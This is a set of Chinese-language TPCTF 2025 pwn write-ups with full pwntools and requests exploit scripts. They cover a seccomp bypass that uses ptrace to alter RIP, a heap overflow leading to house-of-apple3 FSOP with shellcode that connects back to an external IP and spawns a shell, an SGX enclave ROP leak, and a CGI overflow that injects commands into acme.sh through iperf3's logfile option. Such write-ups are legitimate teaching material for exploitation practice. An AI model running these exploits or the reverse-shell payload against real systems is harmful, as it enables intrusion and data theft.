posts.text: CanonEvent题目功能读入shellcode然后执行 启用了沙盒，规则如下 12345678910 line CODE JT JF K================================= 0000: 0x20 0x00 0x00 0x0000000c A = instruction_pointer >> 32 0001: 0x35 0x04 0x00 0x00008000 if (A >= 0x8000) goto 0006 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x15 0x02 0x00 0x0000003d if (A == wait4) goto 0006 0004: 0x15 0x01 0x00 0x00000065 if (A == ptrace) goto 0006 0005: 0x15 0x00 0x01 0x00000039 if (A != fork) goto 0007 0006: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0007: 0x06 0x00 0x00 0x80000000 return KILL_PROCESS 漏洞点沙盒规则中规定当rip高位大于0x8000时直接ALLOW无视沙盒规则而在syscall trace流程中，ptrace实际在seccomp检查之前 123456789101112131415161718192021222324252627282930313233343536373839static long syscall_trace_enter(struct pt_regs *regs, long syscall, unsigned long work){ long ret = 0; /* * Handle Syscall User Dispatch. This must comes first, since * the ABI here can be something that doesn't make sense for * other syscall_work features. */ if (work & SYSCALL_WORK_SYSCALL_USER_DISPATCH) { if (syscall_user_dispatch(regs)) return -1L; } /* Handle ptrace */ if (work & (SYSCALL_WORK_SYSCALL_TRACE | SYSCALL_WORK_SYSCALL_EMU)) { ret = ptrace_report_syscall_entry(regs); if (ret || (work & SYSCALL_WORK_SYSCALL_EMU)) return -1L; } /* Do seccomp after ptrace, to catch any tracer changes. */ if (work & SYSCALL_WORK_SECCOMP) { ret = __secure_computing(NULL); if (ret == -1L) return ret; } /* Either of the above might have changed the syscall number */ syscall = syscall_get_nr(current, regs); if (unlikely(work & SYSCALL_WORK_SYSCALL_TRACEPOINT)) trace_sys_enter(regs, syscall); syscall_enter_audit(regs, syscall); return ret ? : syscall;} 利用流程先fork一个子进程，子进程开始先int3中断使得主进程能在shellcraft.cat("./flag")前开始TRACE SYSCALL 主进程用PTRACE去TRACE子进程 SYSCALL,trace第一次触发在syscall入口时修改RIP至一个非法高位地址，即可 bypass seccomp检查进行一次系统调用 之后在执行完syscall后再次触发TRACE SYSCALL，此时将RIP设回合法值继续执行即可 exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#!usr/bin/env python3# Date: 2025-02-22 22:58:26# Link: https://github.com/RoderickChan/pwncli# Usage:# Debug : python3 exp.py debug elf-file-path -t -b malloc# Remote: python3 exp.py remote elf-file-path ip:portfrom pwncli import *cli_script()io: tube = gift.ioelf: ELF = gift.elflibc: ELF = gift.libc# one_gadgets: list = get_current_one_gadget_from_libc(more=False)# CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)code = """mov rax, 0x39syscallmov r12, raxcmp rax,0jne parent"""code += shellcraft.ptrace(0, 0, 0, 0)code += """int3"""code += shellcraft.cat("./flag")code += """retparent:"""code+=shellcraft.wait4("r12",0,0,0)code += """continue:"""# syscall前, 修改rip为高值code+=shellcraft.ptrace(0x18,"r12",0,0) #让目标下一个syscall停下来code+=shellcraft.wait4("r12",0,0,0) #等待目标停下来code+=shellcraft.ptrace(12,"r12",0,"rsp") #获取寄存器(struct user_regs_struct)到内存data中code+=''' mov r8,rsp mov r11,qword ptr [r8+0x78]'''code+=''' mov r13, 0x8fffffffffffffff mov r14, qword ptr[r8+0x80] mov qword ptr [r8+0x80], r13'''code+=shellcraft.ptrace(13,"r12","rsp") # 写回内存# syscall后,恢复rip原值code+=shellcraft.ptrace(0x18,"r12",0,0) #让目标下一个syscall停下来code+=shellcraft.wait4("r12",0,0,0) #等待目标停下来code+=shellcraft.ptrace(12,"r12",0,"rsp") #获取寄存器(struct user_regs_struct)到内存data中code+=''' mov r8,rsp mov qword ptr [r8+0x80], r14'''code+=shellcraft.ptrace(13,"r12","rsp") # 写回内存code+=''' jmp continue'''payload = asm(code)ru("code size: ")pause()sl(str(len(payload)))ru("enter shellcode: ")s(payload)ia()

unlimited-diary题目功能 add: 对于msg堆块有malloc(size+1) edit: 从meta堆块中取msg堆块的大小，只能读入堆块大小的数据 free：对指针都清零，无漏洞 show: 使用write打印meta堆块存的msg的大小 漏洞点 add：当size为2**32时，会malloc(0)，分配0x20的堆块，此时存在meta堆块中的大小为2**32，达成堆溢出 show: write泄露地址 利用思路释放堆块到ub然后再分配出来show实现泄露libc然后利用漏洞点1实现tcache poisoning, 分配到stderr最后house of apple3 + 一骑当千 #!/usr/bin/env python3# Link: https://github.com/RoderickChan/pwncli# Usage:# Debug : python3 exp.py debug elf-file-path -t -b malloc# Remote: python3 exp.py remote elf-file-path ip:portfrom pwncli import *cli_script()# gift.io = remote("127.0.0.1", 9999)io: tube = gift.ioelf: ELF = gift.elflibc: ELF = gift.libc# one_gadgets: list = get_current_one_gadget_from_libc(more=False)# CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)def cmd(i): sa("> ", i)def add(size,msg): cmd('1') ru("Input length:
") s(str(size)) ru("Input content:
") sl(msg)def edit(idx, msg): cmd('3') ru("Input index:
") s(str(idx)) ru("Input content:
") sl(msg) #......def show(idx): cmd('4') ru("Input index:
") s(str(idx)) ru(b'Content:
') #......def dele(idx): cmd('2') ru( "Input index:
") s(str(idx)) #......add(0x500, "A") #0add(0x500, "B") #1add(0xFFFFFFFF, "C") #2add(0x400-1, "D") # 3dele(0)dele(1)add(0x500, "
") # 0show(0)libc_base = u64(r(8)) - 0x203b00leak_ex2(libc_base)heap_base = u64(r(8))leak_ex2(heap_base)add(0x500, "B") #1libc.address = libc_basepayload = flat( "A"*0x10, 0, 0x21, libc.sym['_IO_2_1_stderr_'], p32(0x500))edit(2, payload)fake_IO_file_addr = libc.sym["_IO_2_1_stderr_"]fake_ucontext_addr = fake_IO_file_addr + 0x100 _IO_wide_data_1 = libc_base + 0x2037e0_IO_wfile_jumps = libc.sym['_IO_wfile_jumps']chunk1 = libc.bss(0x500)# house of apple3fake_IO_file = p64(0xffffffffffffffff) #_IO_read_endtablefake_IO_file += p64(0) * 2 + p64(1) fake_IO_file = fake_IO_file.ljust(0x30, b'\x00')fake_IO_file += p64(fake_IO_file_addr + 0x100) # _IO_buf_end = codecvt->__cd_in.stepfake_IO_file = fake_IO_file.ljust(0x78, b'\x00')fake_IO_file += p64(chunk1) # lockfake_IO_file = fake_IO_file.ljust(0x88, b'\x00')fake_IO_file += p64(fake_IO_file_addr + 0x40) # _codecvtfake_IO_file += p64(_IO_wide_data_1) # 尽量保持不变fake_IO_file = fake_IO_file.ljust(0xc8, b'\x00')fake_IO_file += p64(_IO_wfile_jumps+8) # vtablefake_IO_file = fake_IO_file.ljust(0xf0, b'\x00')fake_IO_file += p64(0) # fake_ucontext_addrfake_IO_file += p64(0) * 4fake_IO_file += p64(libc.sym['setcontext'])# house of 一骑当千rdi = fake_ucontext_addr & ~0xfff # heap_addr binsh_addrrsi = 0x1000 rbp = fake_ucontext_addr + 0x100rbx = 0rdx = 7rcx = 0rax = 0rsp = fake_ucontext_addr + 0x100rip = libc.sym['mprotect']ucontext = b''ucontext += p64(0) * 7ucontext += p64(rdi) + p64(rsi)ucontext += p64(rbp) + p64(rbx)ucontext += p64(rdx) + p64(rcx)ucontext += p64(rax)ucontext += p64(rsp) + p64(rip)ucontext = ucontext.ljust((0xe0 - 0x30), b'\x00')ucontext += p64(chunk1 + 0x1000)ucontext = ucontext.ljust((0x100 - 0x30), b'\x00')shellcode = p64(fake_ucontext_addr + 0x110) + p64(0) + asm( shellcraft.connect('47.122.69.27',2333,'ipv4')+shellcraft.dupsh())payload = p64(0) + p64(0) + fake_IO_file + ucontext + bytes(shellcode)edit(3, payload)cmd('5')# sleep(3)# io.shutdown('out')ia() unauthwarden-#1（复盘）题目描述获取程序的root密码 题目功能用户注册登录以后有以下功能：1 添加本地msg2 显示本地msg4 将本地msg存储到sgx5 显示sgx中seal后的msgroot密码存储在enclave的bss中 漏洞点 在登录时输出用户名使用的是ecall_print_username:存在格式化字符串漏洞 在 test_app中的add_send_entry函数，对应功能1：由图可知数据长度可控，最大0x2000而在 unauthwarden.signed.so 的 ecall_do_seal_send函数中buffer仅256字节，在将输入的数据拷贝到buffer时存在溢出，造成栈溢出： 利用思路：先通过格式化字符串漏洞泄露pie然后利用ecall_do_seal_send的栈溢出进行ROP，ROP中调用已有的字符串输出函数ocall_print_string实现输出 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101#!/usr/bin/env python3# Link: https://github.com/RoderickChan/pwncli# Usage:# Debug : python3 exp.py debug elf-file-path -t -b malloc# Remote: python3 exp.py remote elf-file-path ip:portfrom pwncli import *cli_script()io: tube = gift.ioelf: ELF = gift.elflibc: ELF = gift.libc# one_gadgets: list = get_current_one_gadget_from_libc(more=False)# CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)def cmd(i): sa(">> ", i)def login(user, passwd): cmd('1') ru("Enter username: ") s(user) ru("Enter password: ") s(passwd) #......def reg(user,passwd): cmd('2') ru("Enter username: ") s(user) ru("Enter password: ") s(passwd)def add_send(msg): cmd('4') ru('Input your data length to seal: ') s(str(len(msg))) ru('batch):') for i in range(0, len(msg), 256): chunk = msg[i:i + 256] s(chunk) ru('(y/n):') sl('y')user = b"%10$p"passwd = b"ABC"reg(user,passwd)login(user,passwd)ru('Welcome back, ')pie = int(ru('
',True), 16)pie = pie - 0x292000root_passwd = pie + 0x11a000leak_ex2(pie)leak_ex2(root_passwd)pause()# asm_oret = pie + 0x11257E# asm_oret = pie + 0x010F43Aocall_print_string = pie + 0x28A0# rsp = pie + 0x271a88pop_rdi_ret = pie + 0x0000000000001261## leak_ex2(asm_oret)leak_ex2(ocall_print_string)leak_ex2(pop_rdi_ret)# leak_ex2(rsp)bp = pie+0x1e1dleak_ex2(bp)## ocall_context = flat({# 8*11: flat(# rsp+21*8, # rbp# root_passwd # rdi# ),# 0x98: rsp-0x20# },filler=b"\x00").ljust(18*8, b"\x00")## payload = flat(# "A"*256,# "AAAAAAAA",# asm_oret,# ocall_context,# 0,# ocall_print_string# )payload = flat( "A"*0x118, pop_rdi_ret, root_passwd, ocall_print_string)pause()add_send(payload)# add_send("A"*256+"B"*0x10)ia()

posts.title: TPCTF 2025 pwn
posts.text: where is my rop利用思路login.cgi 在登录时使用POST和login.cgi交互，其中Authorization头格式是username:加密的password，载荷是session id。 在login.cgi中会使用libCgi.so中的send_cmd函数和basement使用socket交互，但调用函数之前有检查： session id长度要是24，这里直接按正常流程GET cgi-bin/gen_enc?id获取session id。 header中Authorization的值取”Basic “后的检查：要在base64加密字符集内 漏洞点：在login.cgi中main函数对Authorization请求头解析时对内容长度的限制非常宽松，允许最大0x400长度的base64密文输入，而base64解码后存储的位置仅0x200大小，存在溢出，可以篡改_BYTE opcode全局变量 base64解密后检查是否有三个冒号分隔，且各个分段长度不超过0x80。 检查通过以后会调用send_cmd函数 由以上条件可知auth_parms一定得是类似Basic AAAA:BBBB:CCCC:DDDD的格式才能执行到send_cmd与basement交互 send_cmd函数功能是向basement监听的/tmp/tpctf.sock建立socket连接并传输这几个参数send_cmd定义如下： 1char *__fastcall send_cmd(int opcode, int length, char *payload) 第一个参数代表了要访问basement的功能编号 第二个是payload长度 第三个是指向payload的指针 basementbasement的main函数先读取opcode,然后是length，最后payload , 然后按照opcode调用分别的功能函数 由于我们能完全控制opcode，可以指定调用1-12任意的功能函数 1-5 sqlite3数据库操作 6-9 iperf3, ping, traceroute 命令执行，存在命令注入 10-12 假装使用acme.sh注册证书命令执行， 题目中的acme.sh其实是一个空的脚本文件 所有命令注入的位置都使用isSafeCommandArg()过滤字符 12345from ctypes import *l = CDLL("./libCgi.so")for i in range(0x1, 0x7f): if l.isSafeCommandArg(chr(i)): print(chr(i)), end="") 使用脚本获取的允许的字符集如下： 1\r\t!"#%'()*+,-./0123456789:=?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]_abcdefghijklmnopqrstuvwxyz{}~% 禁用了所有的管道符、分号、换行等，不能在原指令基础上另起一个新的指令，只能试着改程序的参数 其中iperf3可以传输文件，但是机器不出网，无法连接到服务器端口但iperf3有可以输出文件的选项 1--logfile f send output to a log file 与此同时还支持自定义日志每行最左端时间戳的样式，使得日志每行开头都可控，注入指令后利用#注释可以将无关部分去除，实现给指定文件写入任意shell指令 1--timestamps<=format> emit a timestamp at the start of each output line 10-12 功能运行了acme.sh这个sh脚本，考虑先用功能6将要执行的shell指令写入acme.sh，再使用功能10运行acme.sh 尝试 cp /*flag* /var/www/html/flag，本地成功但远程访问/flag时404，怀疑flag文件名有改动，使用 1tar -zcvf /var/www/html/flag.tar --exclude=/proc --exclude=/sys / 将根目录下除过滤的目录外全部压缩，然后浏览器访问/flag.tar下载即可得到flag远程flag文件名被改成了the_flaG_is_here056480436103548697634文件名中的G大写导致了之前没有成功复制文件 exp123456789101112131415161718192021222324252627282930313233343536373839import requestsimport base64session = requests.Session()rl = "61.147.171.105:54863"# rl = "127.0.0.1"# 获取session id url = f"http://{rl}/cgi-bin/gen_enc?id"response = session.get(url)id = response.text.replace("<html><body>","").replace("</body></html>", "")def login(opcode, auth_parms): url = f"http://{rl}/cgi-bin/login.cgi?login" data = "id=" + id auth_parms = auth_parms.ljust(0x200, b"\x00") auth_parms += bytes([opcode]) + b"\x61" auth_parms = base64.b64encode(auth_parms).decode() headers = { "Content-Type": "application/x-www-form-urlencoded", "Authorization": "Basic " + auth_parms } response = session.post(url, data=data, headers=headers) login_result = response.headers['X-Redirect-URL'] print(login_result) print(f"状态码: {response.status_code}") print()# 向acme.sh注入指令：压缩根目录所有文件auth_parms = b"2.1.1.1:1234 --logfile /root/.acme.sh/acme.sh --timestamps=\"tar -zcvf /var/www/html/flag.tar --exclude=/proc --exclude=/sys / #\":CCCC:DDDD\x00"login(0x6, auth_parms)# 触发执行acme.shauth_parms = b"AAAA:BBBB:CCCC:DDDD\x00"login(0xb, auth_parms)
